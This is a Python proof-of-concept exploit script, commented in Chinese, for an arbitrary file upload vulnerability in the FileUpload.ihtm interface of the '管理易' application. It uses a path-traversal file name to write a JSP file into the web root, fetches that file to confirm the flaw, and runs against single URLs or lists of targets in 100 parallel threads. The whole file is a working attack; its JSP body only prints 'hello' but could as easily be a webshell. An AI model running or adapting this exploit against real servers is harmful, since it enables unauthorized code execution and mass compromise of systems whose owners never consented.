import argparse
import requests
import os
import sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 

______ _ _      _   _       _                 _ 
|  ___(_) |    | | | |     | |               | |
| |_   _| | ___| | | |_ __ | | ___   __ _  __| |
|  _| | | |/ _ \ | | | '_ \| |/ _ \ / _` |/ _` |
| |   | | |  __/ |_| | |_) | | (_) | (_| | (_| |
\_|   |_|_|\___|\___/| .__/|_|\___/ \__,_|\__,_|
                     | |                        
                     |_|                        
"""
    print(test)

def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="管理易FileUpload接口任意文件上传漏洞")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        if not os.path.exists(args.file):
            print(f"[!] {args.file} 文件不存在，请检查路径")
            return
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                if url:  # 确保不添加空行
                    url_list.append(url)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t 管理易FileUpload接口任意文件上传漏洞.py -h")


def poc(target):
    url = f"{target}/app/FileUpload.ihtm?comm_type=EKING&file_name=../../rce.jsp"
    headers = {
        "Host": target.split("//")[1],  # 提取主机名
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=WebKitFormBoundaryHHaZAYecVOf5sfa6"
    }
    data = (
        "--WebKitFormBoundaryHHaZAYecVOf5sfa6\r\n"
        'Content-Disposition: form-data; name="uplo_file"; filename="rce.jpg"\r\n'
        "\r\n"
        "<% out.println(\"hello\");%>\r\n"
        "--WebKitFormBoundaryHHaZAYecVOf5sfa6--\r\n"
    )
    payload = "/rce.jsp"
    try:
        response = requests.post(url, headers=headers, data=data, verify=False)
        if response.status_code == 200 :
            res1 = requests.post(target+payload, verify=False)
            if res1.status_code == 200 and 'hello' in res1.text:
                print(f"[!] {target} 存在管理易FileUpload接口任意文件上传漏洞")
            else:
                print(f"[!] {target} 未检测到管理易FileUpload接口任意文件上传漏洞")
        else:
            print(f"[!] {target} 未检测到管理易FileUpload接口任意文件上传漏洞")
    except Exception as e:
        print(f"[!] {target} 未检测到管理易FileUpload接口任意文件上传漏洞")
        print(e)


if __name__ == '__main__':
    main()
